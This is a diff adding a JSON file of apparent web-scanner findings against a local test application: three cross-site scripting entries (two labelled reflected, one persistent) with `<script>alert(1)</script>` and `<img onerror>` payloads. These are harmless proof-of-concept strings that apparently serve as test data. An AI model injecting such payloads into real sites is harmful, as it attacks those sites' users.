@@ -1,0 +1,23 @@
+[
+    {
+        "name": "Cross Site Scripting (Reflected)",
+        "url": "http://localhost:5001/persistent",
+        "method": "POST",
+        "param": "comment",
+        "attack": "</p><script>alert(1);</script><p>"
+    },
+    {
+        "name": "Cross Site Scripting (Reflected)",
+        "url": "http://localhost:5001/reflected?query=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3B%3E",
+        "method": "GET",
+        "param": "query",
+        "attack": "<img src=x onerror=alert(1);>"
+    },
+    {
+        "name": "Cross Site Scripting (Persistent)",
+        "url": "http://localhost:5001/persistent",
+        "method": "POST",
+        "param": "comment",
+        "attack": "</p><script>alert(1);</script><p>"
+    }
+]
